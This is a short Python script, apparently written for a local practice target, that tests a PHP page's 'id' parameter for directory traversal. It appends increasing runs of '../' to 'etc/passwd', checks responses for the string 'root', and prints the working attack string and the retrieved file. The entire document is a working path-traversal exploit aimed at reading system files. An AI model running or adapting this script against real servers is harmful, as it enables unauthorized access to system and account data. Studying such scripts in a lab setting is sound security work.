import requests

url = "http://127.0.0.1/traversal/third.php?id="
payloads = {'etc/passwd': 'root'}
up = "../"
max_up_directories = 7

for payload, string in payloads.items():
    for i in range(max_up_directories):
        try:
            req = requests.post(url + (i * up) + payload)
            if string in req.text:
                print("Parameter vulnerable")
                print("Attack string: " + (i * up) + payload)
                print(req.text)
                break
        except requests.exceptions.RequestException as e:
            print("Error: " + str(e))
    else:
        print("String not found with " + str(max_up_directories) + " up directories.")
